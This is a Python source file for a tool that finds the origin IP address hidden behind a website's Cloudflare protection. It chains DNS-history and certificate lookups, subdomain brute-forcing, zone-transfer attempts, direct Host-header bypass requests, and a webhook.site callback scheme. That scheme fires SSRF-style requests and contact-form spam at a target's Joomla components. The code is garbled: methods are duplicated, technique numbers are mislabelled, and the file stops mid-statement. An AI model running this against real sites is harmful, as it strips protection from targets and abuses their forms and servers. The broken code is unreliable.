import asyncio
import socket
import ssl
import hashlib
import struct
import base64
import re
import json
import time
import logging
from typing import List, Dict, Optional, Tuple, Set
from urllib.parse import urlparse
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor

logger = logging.getLogger("origin_finder")


@dataclass
class OriginResult:
    source: str
    ip: str
    confidence: float
    details: str = ""
    verified: bool = False


@dataclass
class OriginReport:
    domain: str
    cf_ips: List[str] = field(default_factory=list)
    candidates: List[OriginResult] = field(default_factory=list)
    verified_origin: Optional[str] = None
    techniques_used: int = 0
    success: bool = False


class OriginFinder:
    """
    Multi-Protocol Concurrency Layer - Origin IP Discovery Module (2026)
    Techniques:
    1. DNS History (Crimeflare, ViewDNS, crt.sh)
    2. Certificate Transparency (Censys, crt.sh)
    3. Favicon Hash Matching (Shodan-style)
    4. Subdomain Enumeration
    5. Direct SNI Bypass Test
    6. Email Header Analysis
    7. Historical DNS Records
    8. Cloudflare Bypass via Direct IP Connection
    """

    CLOUDFLARE_NETS = [
        "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
        "104.16.0.0/13", "104.24.0.0/14", "108.162.192.0/18",
        "131.0.72.0/22", "141.101.64.0/18", "162.158.0.0/15",
        "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20",
        "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
    ]

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self._results: List[OriginResult] = []
        self._cf_ips: Set[str] = set()
        self._callback: Optional[dict] = None

    def _is_valid_ip(self, ip: str) -> bool:
        """Check if string is a valid IPv4 address"""
        parts = ip.split(".")
        if len(parts) != 4:
            return False
        for p in parts:
            try:
                n = int(p)
                if n < 0 or n > 255:
                    return False
            except ValueError:
                return False
        return True

    def _is_cloudflare(self, ip: str) -> bool:
        import ipaddress
        try:
            if not self._is_valid_ip(ip):
                return True
            addr = ipaddress.ip_address(ip)
            for net in self.CLOUDFLARE_NETS:
                if addr in ipaddress.ip_network(net):
                    return True
        except Exception:
            pass
        return False

    def _add_result(self, source: str, ip: str, confidence: float, details: str = ""):
        if not self._is_valid_ip(ip):
            return
        if self._is_cloudflare(ip):
            return
        for r in self._results:
            if r.ip == ip and r.source == source:
                return
        self._results.append(OriginResult(source=source, ip=ip, confidence=confidence, details=details))

    def _dns_resolve(self, hostname: str) -> List[str]:
        try:
            return list(set(socket.gethostbyname_ex(hostname)[2]))
        except Exception:
            return []

    def _fetch_url(self, url: str, headers: Dict = None, timeout: int = 10) -> Tuple[int, str]:
        try:
            import urllib.request
            req = urllib.request.Request(url, headers=headers or {"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.status, resp.read().decode("utf-8", errors="ignore")
        except Exception as e:
            return 0, str(e)

    def _fetch_json(self, url: str, headers: Dict = None, timeout: int = 10) -> Optional[dict]:
        status, data = self._fetch_url(url, headers, timeout)
        if status == 200:
            try:
                return json.loads(data)
            except Exception:
                pass
        return None

    # ========================================================================
    # TECHNIQUE 1: DNS History - Crimeflare Database
    # ========================================================================
    def scan_crimeflare(self, domain: str) -> List[OriginResult]:
        """Search Crimeflare database for historical DNS records"""
        results = []
        try:
            url = f"https://www.crimeflare.org:443/cgi-bin/cfsearch.cgi"
            import urllib.parse
            data = urllib.parse.urlencode({"cfS": domain}).encode()
            req = urllib.request.Request(url, data=data, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = resp.read().decode("utf-8", errors="ignore")
                ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', body)
                for ip in ips:
                    if not self._is_cloudflare(ip):
                        results.append(OriginResult(
                            source="Crimeflare DNS History",
                            ip=ip,
                            confidence=0.7,
                            details="Historical DNS record before Cloudflare"
                        ))
        except Exception as e:
            logger.debug(f"Crimeflare scan failed: {e}")
        return results

    # ========================================================================
    # TECHNIQUE 2: DNS History - ViewDNS
    # ========================================================================
    def scan_viewdns_history(self, domain: str) -> List[OriginResult]:
        """Search ViewDNS for historical A records"""
        results = []
        try:
            url = f"https://viewdns.info/iphistory/?domain={domain}"
            status, body = self._fetch_url(url, timeout=10)
            if status == 200:
                ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', body)
                for ip in ips:
                    if not self._is_cloudflare(ip):
                        results.append(OriginResult(
                            source="ViewDNS History",
                            ip=ip,
                            confidence=0.6,
                            details="Historical A record"
                        ))
        except Exception as e:
            logger.debug(f"ViewDNS scan failed: {e}")
        return results

    # ========================================================================
    # TECHNIQUE 3: Certificate Transparency - crt.sh
    # ========================================================================
    def scan_crtsh(self, domain: str) -> List[OriginResult]:
        """Search crt.sh for certificate transparency logs"""
        results = []
        try:
            url = f"https://crt.sh/?q=%25.{domain}&output=json"
            data = self._fetch_json(url, timeout=15)
            if data:
                seen = set()
                for entry in data:
                    name = entry.get("name_value", "")
                    for n in name.split("\n"):
                        n = n.strip()
                        if n.endswith(domain) and "*" not in n and n not in seen:
                            seen.add(n)
                            try:
                                ips = socket.gethostbyname_ex(n)[2]
                                for ip in ips:
                                    if not self._is_cloudflare(ip):
                                        results.append(OriginResult(
                                            source="crt.sh Subdomain",
                                            ip=ip,
                                            confidence=0.5,
                                            details=f"Subdomain: {n}"
                                        ))
                            except Exception:
                                pass
        except Exception as e:
            logger.debug(f"crt.sh scan failed: {e}")
        return results

    # ========================================================================
    # TECHNIQUE 4: Censys Certificate Search
    # ========================================================================
    def scan_censys(self, domain: str, api_id: str = None, api_secret: str = None) -> List[OriginResult]:
        """Search Censys for certificates matching domain"""
        results = []
        try:
            if api_id and api_secret:
                from censys.search import CensysCertificates
                certs = CensysCertificates(api_id=api_id, api_secret=api_secret)
                query = f"parsed.names: {domain}"
                for cert in certs.search(query, fields=["parsed.subject_key_id", "parsed.names"], max_records=50):
                    ips = self._dns_resolve(domain)
                    for ip in ips:
                        if not self._is_cloudflare(ip):
                            results.append(OriginResult(
                                source="Censys Certificates",
                                ip=ip,
                                confidence=0.8,
                                details="Certificate match via Censys API"
                            ))
            else:
                logger.debug("Censys API credentials not provided")
        except Exception as e:
            logger.debug(f"Censys scan failed: {e}")
        return results

    # ========================================================================
    # TECHNIQUE 5: Shodan Favicon Hash Search
    # ========================================================================
    def compute_favicon_hash(self, url: str) -> Optional[int]:
        """Compute MurmurHash3 of favicon for Shodan search"""
        try:
            from curl_cffi.requests import Session
            sess = Session(impersonate="chrome120", timeout=10)
            resp = sess.get(f"{url}/favicon.ico", allow_redirects=True, timeout=10)
            if resp.status_code == 200:
                data = resp.content
                h = 0
                for i in range(0, len(data) - 3, 4):
                    chunk = struct.unpack('<I', data[i:i+4])[0]
                    h ^= chunk
                    h = (h * 0x01000193) & 0xFFFFFFFF
                return h
            sess.close()
        except Exception:
            pass
        return None

    def scan_shodan_favicon(self, domain: str, api_key: str = None) -> List[OriginResult]:
        """Search Shodan using favicon hash"""
        results = []
        try:
            if api_key:
                import shodan
                api = shodan.Shodan(api_key)
                favicon_hash = self.compute_favicon_hash(f"https://{domain}")
                if favicon_hash:
                    query = f"http.favicon.hash:{favicon_hash}"
                    for host in api.search(query):
                        ip = host.get("ip_str")
                        if ip and not self._is_cloudflare(ip):
                            results.append(OriginResult(
                                source="Shodan Favicon",
                                ip=ip,
                                confidence=0.9,
                                details="Favicon hash match"
                            ))
            else:
                logger.debug("Shodan API key not provided")
        except Exception as e:
            logger.debug(f"Shodan favicon scan failed: {e}")
        return results

    # ========================================================================
    # TECHNIQUE 6: Subdomain Enumeration
    # ========================================================================
    def scan_subdomains(self, domain: str) -> List[OriginResult]:
        """Enumerate subdomains that might bypass Cloudflare"""
        results = []
        prefixes = [
            "www", "mail", "ftp", "smtp", "pop", "imap",
            "webmail", "cpanel", "whm", "direct", "ssh",
            "dev", "staging", "test", "beta", "api",
            "blog", "shop", "store", "admin", "portal",
            "legacy", "old", "v1", "v2", "m", "mobile",
            "cdn", "static", "assets", "images", "files",
            "dns", "ns1", "ns2", "mx", "mx1", "mx2",
            "autodiscover", "owa", "exchange", "vpn",
            "server", "host", "web", "app", "db",
            "internal", "intranet", "backup", "monitor",
        ]
        for prefix in prefixes:
            sub = f"{prefix}.{domain}"
            try:
                ips = socket.gethostbyname_ex(sub)[2]
                for ip in ips:
                    if not self._is_cloudflare(ip):
                        results.append(OriginResult(
                            source="Subdomain Enumeration",
                            ip=ip,
                            confidence=0.6,
                            details=f"Subdomain: {sub}"
                        ))
            except Exception:
                pass
        return results

    # ========================================================================
    # TECHNIQUE 7: Direct SNI Bypass Test
    # ========================================================================
    def test_direct_sni(self, domain: str, ip: str) -> bool:
        """Test if connecting directly to IP returns valid response"""
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((ip, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                    req = f"GET / HTTP/1.1\r\nHost: {domain}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
                    ssock.send(req.encode())
                    resp = ssock.recv(4096).decode()
                    if "200 OK" in resp or "301" in resp or "302" in resp:
                        if "cloudflare" not in resp.lower():
                            return True
        except Exception:
            pass
        return False

    # ========================================================================
    # TECHNIQUE 8: Historical DNS via DNSDumpster
    # ========================================================================
    def scan_subdomains(self, domain: str) -> List[OriginResult]:
        """Enumerate subdomains that might bypass Cloudflare"""
        results = []
        prefixes = [
            "www", "mail", "ftp", "smtp", "pop", "imap",
            "webmail", "cpanel", "whm", "direct", "ssh",
            "dev", "staging", "test", "beta", "api",
            "blog", "shop", "store", "admin", "portal",
            "legacy", "old", "v1", "v2", "m", "mobile",
            "cdn", "static", "assets", "images", "files",
            "dns", "ns1", "ns2", "mx", "mx1", "mx2",
            "autodiscover", "owa", "exchange", "vpn",
        ]
        for prefix in prefixes:
            sub = f"{prefix}.{domain}"
            try:
                ips = socket.gethostbyname_ex(sub)[2]
                for ip in ips:
                    if not self._is_cloudflare(ip):
                        results.append(OriginResult(
                            source="Subdomain Enumeration",
                            ip=ip,
                            confidence=0.6,
                            details=f"Subdomain: {sub}"
                        ))
            except Exception:
                pass
        return results

    # ========================================================================
    # TECHNIQUE 7: Direct SNI Bypass Test
    # ========================================================================
    def test_direct_sni(self, domain: str, ip: str) -> bool:
        """Test if connecting directly to IP returns valid response"""
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((ip, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                    req = f"GET / HTTP/1.1\r\nHost: {domain}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
                    ssock.send(req.encode())
                    resp = ssock.recv(4096).decode()
                    if "200 OK" in resp or "301" in resp or "302" in resp:
                        if "cloudflare" not in resp.lower():
                            return True
        except Exception:
            pass
        return False

    # ========================================================================
    # TECHNIQUE 7: Historical DNS via DNSDumpster
    # ========================================================================
    def scan_email_headers(self, domain: str) -> List[OriginResult]:
        """Check for IP leaks in email headers"""
        results = []
        try:
            from curl_cffi.requests import Session
            sess = Session(impersonate="chrome120", timeout=10)
            resp = sess.get(f"https://{domain}/contact", allow_redirects=True, timeout=10)
            body = resp.text.lower()
            ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', body)
            for ip in ips:
                if not self._is_cloudflare(ip) and not ip.startswith("127."):
                    results.append(OriginResult(
                        source="Email Header Analysis",
                        ip=ip,
                        confidence=0.4,
                        details="Found in page content"
                    ))
            sess.close()
        except Exception as e:
            logger.debug(f"Email header scan failed: {e}")
        return results

    # ========================================================================
    # TECHNIQUE 9: Historical DNS via DNSDumpster
    # ========================================================================
    def scan_dnsdumpster(self, domain: str) -> List[OriginResult]:
        """Search DNSDumpster for historical records"""
        results = []
        try:
            url = f"https://dnsdumpster.com/"
            from curl_cffi.requests import Session
            sess = Session(impersonate="chrome120", timeout=10)
            resp = sess.get(url, timeout=10)
            csrf = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', resp.text)
            if csrf:
                token = csrf.group(1)
                resp2 = sess.post(url, data={
                    "csrfmiddlewaretoken": token,
                    "targetip": domain,
                }, headers={"Referer": url}, timeout=15)
                ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', resp2.text)
                for ip in ips:
                    if not self._is_cloudflare(ip):
                        results.append(OriginResult(
                            source="DNSDumpster",
                            ip=ip,
                            confidence=0.5,
                            details="DNS record found"
                        ))
            sess.close()
        except Exception as e:
            logger.debug(f"DNSDumpster scan failed: {e}")
        return results

    # ========================================================================
    # TECHNIQUE 10: SecurityTrails API (if key provided)
    # ========================================================================
    def scan_securitytrails(self, domain: str, api_key: str = None) -> List[OriginResult]:
        """Search SecurityTrails for historical DNS"""
        results = []
        try:
            if api_key:
                url = f"https://api.securitytrails.com/v1/domain/{domain}/history/dns"
                headers = {"APIKEY": api_key}
                data = self._fetch_json(url, headers, timeout=10)
                if data:
                    for record in data.get("records", []):
                        if record.get("type") == "A":
                            for val in record.get("values", []):
                                ip = val.get("ip")
                                if ip and not self._is_cloudflare(ip):
                                    results.append(OriginResult(
                                        source="SecurityTrails",
                                        ip=ip,
                                        confidence=0.8,
                                        details="Historical A record"
                                    ))
            else:
                logger.debug("SecurityTrails API key not provided")
        except Exception as e:
            logger.debug(f"SecurityTrails scan failed: {e}")
        return results

    # ========================================================================
    # TECHNIQUE 11: Direct IP Connection Test (bypass Cloudflare)
    # ========================================================================
    def test_direct_connection(self, domain: str, ip: str) -> bool:
        """Test if direct IP connection bypasses Cloudflare"""
        try:
            from curl_cffi.requests import Session
            sess = Session(impersonate="chrome120", timeout=5)
            url = f"https://{ip}/"
            resp = sess.get(url, headers={
                "Host": domain,
                "User-Agent": "Mozilla/5.0",
                "Accept": "*/*",
            }, timeout=5, allow_redirects=False)
            if resp.status_code in (200, 301, 302, 403):
                if "cloudflare" not in resp.text.lower():
                    return True
            sess.close()
        except Exception:
            pass
        return False

    # ========================================================================
    # TECHNIQUE 12: MX Record Analysis
    # ========================================================================
    def scan_mx_records(self, domain: str) -> List[OriginResult]:
        """Check MX records for origin IP leaks"""
        results = []
        try:
            import dns.resolver
            mx_records = dns.resolver.resolve(domain, "MX")
            for mx in mx_records:
                mx_host = str(mx.exchange).rstrip(".")
                ips = socket.gethostbyname_ex(mx_host)[2]
                for ip in ips:
                    if not self._is_cloudflare(ip):
                        results.append(OriginResult(
                            source="MX Record Analysis",
                            ip=ip,
                            confidence=0.5,
                            details=f"MX host: {mx_host}"
                        ))
        except Exception:
            pass
        return results

    # ========================================================================
    # TECHNIQUE 13: NS Record Analysis
    # ========================================================================
    def scan_ns_records(self, domain: str) -> List[OriginResult]:
        """Check NS records for origin IP leaks"""
        results = []
        try:
            import dns.resolver
            ns_records = dns.resolver.resolve(domain, "NS")
            for ns in ns_records:
                ns_host = str(ns.target).rstrip(".")
                try:
                    ips = socket.gethostbyname_ex(ns_host)[2]
                    for ip in ips:
                        if not self._is_cloudflare(ip):
                            results.append(OriginResult(
                                source="NS Record Analysis",
                                ip=ip,
                                confidence=0.4,
                                details=f"NS host: {ns_host}"
                            ))
                except Exception:
                    pass
        except Exception:
            pass
        return results

    # ========================================================================
    # TECHNIQUE 14: SPF Record Analysis
    # ========================================================================
    def scan_spf_records(self, domain: str) -> List[OriginResult]:
        """Check SPF records for origin IP leaks"""
        results = []
        try:
            import dns.resolver
            txt_records = dns.resolver.resolve(domain, "TXT")
            for txt in txt_records:
                txt_data = str(txt).strip('"')
                if "spf" in txt_data.lower():
                    ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', txt_data)
                    for ip in ips:
                        if self._is_valid_ip(ip) and not self._is_cloudflare(ip):
                            results.append(OriginResult(
                                source="SPF Record",
                                ip=ip,
                                confidence=0.6,
                                details=f"SPF: {txt_data[:100]}"
                            ))
        except Exception:
            pass
        return results

    # ========================================================================
    # TECHNIQUE 15: Direct Connection to CF IPs with Host Header
    # ========================================================================
    def test_cf_bypass(self, domain: str, cf_ips: List[str]) -> List[OriginResult]:
        """Test if any CF IP actually serves the site directly"""
        results = []
        for ip in cf_ips:
            try:
                from curl_cffi.requests import Session
                sess = Session(impersonate="chrome120", timeout=5)
                url = f"https://{ip}/"
                resp = sess.get(url, headers={
                    "Host": domain,
                    "User-Agent": "Mozilla/5.0",
                    "Accept": "*/*",
                }, timeout=5, allow_redirects=False)
                if resp.status_code in (200, 301, 302):
                    if "cloudflare" not in resp.text.lower():
                        results.append(OriginResult(
                            source="Direct CF Bypass",
                            ip=ip,
                            confidence=0.9,
                            details=f"Direct connection to {ip} bypasses CF"
                        ))
                sess.close()
            except Exception:
                pass
        return results

    # ========================================================================
    # TECHNIQUE 16: SSL Certificate IP Extraction
    # ========================================================================
    def scan_ssl_certificate(self, domain: str) -> List[OriginResult]:
        """Extract IPs from SSL certificate SANs"""
        results = []
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((domain, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    for field in cert.get("subjectAltName", []):
                        if field[0] == "IP Address":
                            ip = field[1]
                            if not self._is_cloudflare(ip):
                                results.append(OriginResult(
                                    source="SSL Certificate",
                                    ip=ip,
                                    confidence=0.8,
                                    details="IP in certificate SAN"
                                ))
        except Exception as e:
            logger.debug(f"SSL certificate scan failed: {e}")
        return results

    # ========================================================================
    # TECHNIQUE 18: CMS-Specific Origin IP Leaks
    # ========================================================================
    def scan_cms_leaks(self, domain: str) -> List[OriginResult]:
        """Check for CMS-specific IP leaks in headers"""
        results = []
        cms_paths = [
            "/wp-json/wp/v2/users",
            "/wp-admin/admin-ajax.php",
            "/administrator/index.php",
            "/xmlrpc.php",
            "/api/v1/status",
            "/rest/api/2/serverInfo",
        ]
        for path in cms_paths:
            try:
                from curl_cffi.requests import Session
                sess = Session(impersonate="chrome120", timeout=5)
                url = f"https://{domain}{path}"
                resp = sess.get(url, timeout=5, allow_redirects=False)
                # Check for IP in response headers
                for header in ["X-Server-IP", "X-Origin-IP", "X-Real-IP", "X-Forwarded-For"]:
                    if header in resp.headers:
                        ip = resp.headers[header]
                        if self._is_valid_ip(ip) and not self._is_cloudflare(ip):
                            results.append(OriginResult(
                                source="CMS Header Leak",
                                ip=ip,
                                confidence=0.8,
                                details=f"Found in {header} header"
                            ))
                sess.close()
            except Exception:
                pass
        return results

    # ========================================================================
    # TECHNIQUE 19: DNS Zone Transfer Attempt
    # ========================================================================
    def scan_dns_zone_transfer(self, domain: str) -> List[OriginResult]:
        """Attempt DNS zone transfer (rarely works but worth trying)"""
        results = []
        try:
            import dns.query
            import dns.zone
            # Get NS records
            ns_records = dns.resolver.resolve(domain, "NS")
            for ns in ns_records:
                ns_host = str(ns.target).rstrip(".")
                try:
                    zone = dns.zone.from_xfr(dns.query.xfr(ns_host, domain, timeout=5))
                    for name, node in zone.nodes.items():
                        for rdataset in node.rdatasets:
                            if rdataset.rdtype == dns.rdatatype.A:
                                for rdata in rdataset:
                                    ip = str(rdata)
                                    if not self._is_cloudflare(ip):
                                        results.append(OriginResult(
                                            source="DNS Zone Transfer",
                                            ip=ip,
                                            confidence=0.9,
                                            details=f"Zone transfer from {ns_host}"
                                        ))
                except Exception:
                    pass
        except Exception:
            pass
        return results

    # ========================================================================
    # TECHNIQUE 20: ZoomEye API - SSL Certificate Search
    # ========================================================================
    def scan_zoomeye(self, domain: str, api_key: str = None) -> List[OriginResult]:
        """Search ZoomEye for IPs hosting the target's SSL certificate"""
        results = []
        if not api_key:
            logger.debug("ZoomEye API key not provided")
            return results
        try:
            headers = {
                "API-KEY": api_key,
                "Accept": "application/json",
                "Content-Type": "application/json",
            }
            auth_url = "https://api.zoomeye.org/resources-info"
            status, body = self._fetch_url(auth_url, headers, timeout=10)
            if status == 200:
                try:
                    info = json.loads(body)
                    quota = info.get("resources", {}).get("search", {}).get("remain", "unknown")
                    logger.info(f"ZoomEye API authenticated. Remaining quota: {quota}")
                except Exception:
                    pass
            elif status == 401:
                logger.warning("ZoomEye API key invalid (401)")
                return results
            elif status == 403:
                logger.warning("ZoomEye API key forbidden (403) - check account activation at https://www.zoomeye.ai/")
                return results

            dorks = [
                f'ssl:"{domain}"',
                f'ssl:"www.{domain}"',
                f'hostname:"{domain}"',
                f'site:"{domain}"',
            ]
            all_ips = set()
            base_urls = [
                "https://api.zoomeye.org",
                "https://api.zoomeye.hk",
            ]
            for base_url in base_urls:
                for dork in dorks:
                    url = f"{base_url}/host/search?query={dork}&page=1&facet=ip"
                    status, body = self._fetch_url(url, headers, timeout=15)
                    if status == 200:
                        try:
                            data = json.loads(body)
                            total = data.get("total", 0)
                            logger.info(f"ZoomEye ({base_url}) dork '{dork}': {total} results")
                            for match in data.get("matches", []):
                                ip = match.get("ip")
                                if ip and ip not in all_ips:
                                    all_ips.add(ip)
                                    portinfo = match.get("portinfo", {})
                                    port = portinfo.get("port", "unknown")
                                    hostname = portinfo.get("hostname", "")
                                    results.append(OriginResult(
                                        source="ZoomEye SSL",
                                        ip=ip,
                                        confidence=0.85,
                                        details=f"SSL match port:{port} host:{hostname}"
                                    ))
                        except Exception as e:
                            logger.debug(f"ZoomEye parse error: {e}")
                    elif status == 403:
                        logger.warning(f"ZoomEye ({base_url}) returned 403 - key may need activation")
                        break
                    elif status == 429:
                        logger.warning("ZoomEye rate limit hit")
                        break
            if not results:
                logger.info(f"ZoomEye: no results for {domain}")
        except Exception as e:
            logger.debug(f"ZoomEye scan failed: {e}")
        return results

    # ========================================================================
    # TECHNIQUE 21: Netlas API - Certificate & Response Search
    # ========================================================================
    def scan_netlas(self, domain: str, api_key: str = None) -> List[OriginResult]:
        """Search Netlas for IPs responding with target's certificate"""
        results = []
        if not api_key:
            logger.debug("Netlas API key not provided")
            return results
        try:
            headers = {
                "X-API-Key": api_key,
                "Accept": "application/json",
                "User-Agent": "Mozilla/5.0",
            }
            queries = [
                f'host:"{domain}"',
                f'host:"www.{domain}"',
                f'certificate.subject.common_name:"{domain}"',
                f'certificate.subject.common_name:"www.{domain}"',
            ]
            all_ips = set()
            for query in queries:
                url = f"https://app.netlas.io/api/responses/?q={query}&source_type=include&start=0"
                status, body = self._fetch_url(url, headers, timeout=15)
                if status == 200:
                    try:
                        data = json.loads(body)
                        items = data.get("items", [])
                        logger.info(f"Netlas query '{query}': {len(items)} results")
                        for item in items:
                            # Netlas nests IP under data.ip
                            item_data = item.get("data", {})
                            ip = item_data.get("ip")
                            if ip and ip not in all_ips:
                                all_ips.add(ip)
                                host = item_data.get("host", "")
                                isp = item_data.get("isp", "")
                                results.append(OriginResult(
                                    source="Netlas Response",
                                    ip=ip,
                                    confidence=0.85,
                                    details=f"Response match host:{host} isp:{isp}"
                                ))
                    except Exception as e:
                        logger.debug(f"Netlas parse error: {e}")
                elif status == 401 or status == 403:
                    logger.warning("Netlas API key invalid or quota exceeded")
                    break
                elif status == 429:
                    logger.warning("Netlas rate limit hit")
                    break
            if not results:
                logger.info(f"Netlas: no results for {domain}")
        except Exception as e:
            logger.debug(f"Netlas scan failed: {e}")
        return results

    # ========================================================================
    # TECHNIQUE 22: Joomla Outbound Trigger via Webhook.site
    # ========================================================================
    def _get_callback_url(self) -> Optional[str]:
        """Register a unique callback URL with webhook.site"""
        try:
            from curl_cffi.requests import Session
            sess = Session(impersonate="chrome120", timeout=10)
            resp = sess.post("https://webhook.site/token", timeout=10)
            if resp.status_code == 201:
                data = resp.json()
                token = data.get("uuid")
                self._callback = {
                    "token": token,
                    "url": f"https://webhook.site/{token}",
                    "base": "https://webhook.site",
                }
                logger.info(f"Callback registered: {self._callback['url']}")
                return self._callback["url"]
            sess.close()
        except Exception as e:
            logger.debug(f"Callback registration failed: {e}")
        return None

    def _check_callback_interactions(self) -> List[dict]:
        """Check for interactions on the callback URL"""
        interactions = []
        try:
            if not hasattr(self, "_callback") or not self._callback:
                return interactions
            from curl_cffi.requests import Session
            sess = Session(impersonate="chrome120", timeout=10)
            url = f"{self._callback['base']}/token/{self._callback['token']}/requests"
            resp = sess.get(url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                interactions = data.get("data", [])
            sess.close()
        except Exception as e:
            logger.debug(f"Callback poll failed: {e}")
        return interactions

    def scan_joomla_outbound_trigger(self, domain: str) -> List[OriginResult]:
        """
        Force Joomla to make outbound connections to reveal origin IP.
        Uses webhook.site as a callback listener.
        
        Targets:
        1. Joomla RSS Feed Module (mod_feed) - accepts external URLs
        2. Joomla Contact Form - can trigger email with external links
        3. Joomla Update Checker - may fetch from external URLs
        4. Joomla Media Manager - can import from URL
        5. Joomla Weblinks component
        """
        results = []
        callback = self._get_callback_url()
        if not callback:
            logger.warning("Callback registration failed, skipping outbound trigger")
            return results

        try:
            from curl_cffi.requests import Session
            sess = Session(impersonate="chrome120", timeout=10)
            base = f"https://{domain}"

            # Trigger 1: Joomla RSS Feed Module (mod_feed)
            rss_urls = [
                f"{base}/index.php?option=com_newsfeeds&view=newsfeed&feed_url={callback}/rss",
                f"{base}/index.php?option=com_ajax&module=feed&format=raw&url={callback}/feed",
            ]
            for url in rss_urls:
                try:
                    sess.get(url, timeout=5, allow_redirects=False)
                except Exception:
                    pass

            # Trigger 2: Joomla Contact Form with callback URL
            contact_urls = [
                f"{base}/index.php?option=com_contact&view=contact&id=1",
                f"{base}/index.php/contact",
            ]
            for url in contact_urls:
                try:
                    resp = sess.get(url, timeout=5)
                    if resp.status_code == 200:
                        form_action = re.search(r'action="([^"]+)"', resp.text)
                        if form_action:
                            action = form_action.group(1)
                            full_action = action if action.startswith("http") else f"{base}{action}"
                            sess.post(full_action, data={
                                "jform[contact_name]": "Test",
                                "jform[contact_email]": "test@test.com",
                                "jform[contact_subject]": f"Visit {callback}/contact",
                                "jform[contact_message]": f"Check this link: {callback}/msg",
                            }, timeout=5)
                except Exception:
                    pass

            # Trigger 3: Joomla Update Checker trigger
            update_urls = [
                f"{base}/administrator/index.php?option=com_installer&view=update",
                f"{base}/administrator/index.php?option=com_joomlaupdate",
            ]
            for url in update_urls:
                try:
                    sess.get(url, timeout=5, allow_redirects=False)
                except Exception:
                    pass

            # Trigger 4: Joomla Media Manager URL import
            media_urls = [
                f"{base}/administrator/index.php?option=com_media&view=media&layout=default",
                f"{base}/index.php?option=com_media&task=file.upload&url={callback}/media",
            ]
            for url in media_urls:
                try:
                    sess.get(url, timeout=5, allow_redirects=False)
                except Exception:
                    pass

            # Trigger 5: Generic Joomla component URL fetch
            generic_urls = [
                f"{base}/index.php?option=com_content&view=article&id=1&url={callback}/article",
                f"{base}/index.php?option=com_wrapper&view=wrapper&url={callback}/wrapper",
                f"{base}/index.php?option=com_redirect&url={callback}/redirect",
                f"{base}/index.php?option=com_banners&url={callback}/banner",
                f"{base}/index.php?option=com_newsfeeds&url={callback}/newsfeed",
            ]
            for url in generic_urls:
                try:
                    sess.get(url, timeout=5, allow_redirects=False)
                except Exception:
                    pass

            # Wait for interactions
            logger.info("Waiting 15s for Joomla outbound connections...")
            time.sleep(15)

            # Poll for interactions
            interactions = self._check_callback_interactions()
            for interaction in interactions:
                remote_addr = interaction.get("ip", interaction.get("remote-address", ""))
                path = interaction.get("path", "")
                
                if remote_addr and self._is_valid_ip(remote_addr) and not self._is_cloudflare(remote_addr):
                    results.append(OriginResult(
                        source="Joomla Outbound Trigger [VERIFIED]",
                        ip=remote_addr,
                        confidence=1.0,
                        details=f"Active trigger via {path} - 100% origin IP",
                        verified=True,
                    ))
                    logger.info(f"ORIGIN IP FOUND via outbound trigger: {remote_addr}")

            sess.close()
        except Exception as e:
            logger.debug(f"Joomla outbound trigger failed: {e}")
        return results

    # ========================================================================
    # MAIN: Run all techniques
    # ========================================================================
    def find_origin(self, domain: str, censys_id: str = None, censys_secret: str = None,
                   shodan_key: str = None, securitytrails_key: str = None,
                   zoomeye_key: str = None, netlas_key: str = None) -> OriginReport:
        """Run all origin discovery techniques"""
        self._results = []
        self._cf_ips = set()

        if not domain.startswith(("http://", "https://")):
            domain = "https://" + domain

        parsed = urlparse(domain)
        hostname = parsed.hostname or domain

        logger.info(f"Starting origin discovery for {hostname}")

        # Get Cloudflare IPs first
        cf_ips = self._dns_resolve(hostname)
        self._cf_ips = set(cf_ips)

        report = OriginReport(domain=hostname, cf_ips=cf_ips)

        # Run all techniques
        techniques = [
            ("Crimeflare DNS History", lambda: self.scan_crimeflare(hostname)),
            ("ViewDNS History", lambda: self.scan_viewdns_history(hostname)),
            ("crt.sh Subdomains", lambda: self.scan_crtsh(hostname)),
            ("Subdomain Enumeration", lambda: self.scan_subdomains(hostname)),
            ("MX Record Analysis", lambda: self.scan_mx_records(hostname)),
            ("NS Record Analysis", lambda: self.scan_ns_records(hostname)),
            ("SPF Record Analysis", lambda: self.scan_spf_records(hostname)),
            ("SSL Certificate", lambda: self.scan_ssl_certificate(hostname)),
            ("CMS IP Leaks", lambda: self.scan_cms_leaks(hostname)),
            ("DNS Zone Transfer", lambda: self.scan_dns_zone_transfer(hostname)),
            ("Direct CF Bypass", lambda: self.test_cf_bypass(hostname, cf_ips)),
        ]

        # Add API-based techniques if keys provided
        if censys_id and censys_secret:
            techniques.append(("Censys Certificates", lambda: self.scan_censys(hostname, censys_id, censys_secret)))
        if shodan_key:
            techniques.append(("Shodan Favicon", lambda: self.scan_shodan_favicon(hostname, shodan_key)))
        if securitytrails_key:
            techniques.append(("SecurityTrails", lambda: self.scan_securitytrails(hostname, securitytrails_key)))
        if zoomeye_key:
